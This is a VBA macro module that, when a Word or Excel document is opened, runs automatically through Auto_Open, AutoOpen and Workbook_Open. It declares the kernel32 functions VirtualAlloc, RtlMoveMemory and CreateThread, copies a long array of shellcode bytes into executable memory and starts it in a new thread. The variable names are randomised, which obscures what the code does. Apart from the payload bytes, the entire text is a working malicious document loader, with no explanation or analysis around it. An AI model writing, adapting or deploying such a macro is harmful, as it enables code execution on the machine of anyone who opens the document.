Attribute VB_Name = "NewMacros"
#If Vba7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Mzffzki As Long, ByVal Gnndgoynf As Long, ByVal Cpythnpjf As LongPtr, Eiavcvofi As Long, ByVal Skwpfa As Long, Ekjlc As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Wcjcj As Long, ByVal Qbp As Long, ByVal Llu As Long, ByVal Mxmwxh As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Iwkgcxwgh As LongPtr, ByRef Zfpkusa As Any, ByVal Sewdwcptn As Long) As LongPtr
#Else
        Private Declare Function CreateThread Lib "kernel32" (ByVal Mzffzki As Long, ByVal Gnndgoynf As Long, ByVal Cpythnpjf As Long, Eiavcvofi As Long, ByVal Skwpfa As Long, Ekjlc As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Wcjcj As Long, ByVal Qbp As Long, ByVal Llu As Long, ByVal Mxmwxh As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Iwkgcxwgh As Long, ByRef Zfpkusa As Any, ByVal Sewdwcptn As Long) As Long
#End If

Sub Auto_Open()
        Dim Nyxbriza As Long, Efbtxwrc As Variant, Zkgs As Long
#If Vba7 Then
        Dim Oggw As LongPtr, Ciqpfqv As LongPtr
#Else
        Dim Oggw As Long, Ciqpfqv As Long
#End If
        Efbtxwrc = Array(204, 199, 12, 56, 219, 193, 217, 116, 36, 244, 94, 41, 201, 177, 146, 49, 110, 20, 131, 198, 4, 3, 110, 16, 46, 50, 179, 90, 189, 56, 105, 65, 16, 155, 6, 82, 102, 70, 214, 83, 55, 252, 155, 166, 51, 50, 230, 55, 56, 78, 7, 218, 169, 102, 101, 0, 60, 61, 82, 200, _
114, 34, 71, 58, 62, 152, 167, 120, 243, 96, 242, 38, 247, 90, 119, 116, 61, 235, 179, 177, 1, 236, 171, 66, 225, 33, 87, 147, 53, 62, 67, 94, 158, 101, 86, 8, 141, 184, 94, 187, 47, 160, 43, 64, 114, 229, 128, 243, 86, 47, 193, 183, 233, 148, 180, 209, 109, 202, 248, 107, _
49, 186, 163, 68, 149, 196, 20, 227, 126, 80, 152, 24, 144, 21, 126, 247, 145, 69, 82, 143, 195, 37, 5, 230, 242, 225, 1, 252, 132, 214, 43, 0, 34, 201, 66, 33, 224, 60, 228, 162, 95, 224, 175, 41, 156, 121, 201, 50, 137, 235, 90, 72, 109, 155, 48, 152, 93, 165, 69, 253, _
6, 184, 243, 122, 69, 243, 63, 197, 70, 60, 54, 131, 42, 116, 100, 155, 213, 209, 59, 219, 71, 92, 23, 44, 12, 33, 129, 39, 43, 210, 59, 180, 228, 189, 211, 103, 53, 92, 222, 113, 240, 240, 11, 187, 130, 162, 245, 167, 38, 135, 153, 110, 7, 253, 241, 213, 161, 205, 37, 155, _
137, 75, 164, 7, 65, 40, 42, 153, 179, 20, 84, 205, 118, 19, 86, 2, 41, 245, 116, 243, 101, 158, 88, 236, 188, 193, 221, 149, 238, 160, 157, 82, 177, 14, 164, 174, 207, 147, 210, 49, 167, 174, 40, 103, 150, 208, 240, 212, 10, 17, 237, 165, 224, 249, 248, 72, 185, 181, 253, 42, _
211, 132, 171, 186, 3, 155, 241, 114, 38, 17, 155, 120, 58, 83, 138, 69, 69, 22, 127, 81, 148, 44, 168, 198, 115, 67, 134, 236, 222, 72, 9, 74, 194, 113, 162, 232, 232, 96, 206, 170, 131, 76, 48, 14, 208, 128, 87, 3, 111, 11, 85, 118, 8, 194, 73, 74, 184, 171, 236, 84, _
175, 3, 161, 123, 126, 30, 231, 92, 168, 88, 133, 93, 76, 1, 237, 250, 101, 114, 222, 148, 196, 66, 91, 2, 187, 36, 229, 1, 198, 248, 13, 15, 133, 239, 237, 73, 33, 120, 174, 197, 87, 69, 15, 30, 70, 42, 234, 176, 236, 137, 247, 220, 4, 82, 109, 22, 164, 122, 15, 17, _
242, 248, 111, 164, 194, 118, 2, 136, 47, 84, 52, 42, 134, 236, 227, 38, 53, 30, 236, 191, 254, 71, 129, 84, 55, 145, 90, 132, 6, 200, 92, 20, 48, 19, 228, 39, 104, 108, 203, 75, 216, 149, 40, 154, 147, 187, 92, 195, 209, 126, 157, 100, 15, 191, 223, 69, 223, 3, 241, 65, _
189, 195, 147, 83, 213, 195, 40, 118, 10, 61, 251, 151, 144, 177, 237, 9, 58, 224, 44, 85, 1, 132, 234, 180, 12, 213, 108, 216, 17, 163, 192, 212, 116, 56, 177, 143, 147, 239, 22, 67, 82, 56, 63, 127, 151, 215, 241, 88, 50, 150, 53, 8, 90, 194, 26, 71, 173, 253, 169, 50, _
153, 254, 241, 161, 71, 200, 184, 57, 89, 105, 146, 6, 115, 148, 142, 199, 40, 196, 57, 148, 224, 185, 36, 61, 64, 178, 22, 150, 252, 49, 34, 240, 44, 79, 206, 123, 94, 37, 210, 84, 60, 116, 200, 121, 253, 177, 37, 180, 44, 241, 182, 120, 150, 24, 66, 63, 66, 5, 229, 138, _
188, 126, 255, 249, 107, 18, 246, 17)

        Oggw = VirtualAlloc(0, UBound(Efbtxwrc), &H1000, &H40)
        For Zkgs = LBound(Efbtxwrc) To UBound(Efbtxwrc)
                Nyxbriza = Efbtxwrc(Zkgs)
                Ciqpfqv = RtlMoveMemory(Oggw + Zkgs, Nyxbriza, 1)
        Next Zkgs
        Ciqpfqv = CreateThread(0, 0, Oggw, 0, 0, 0)
End Sub
Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub
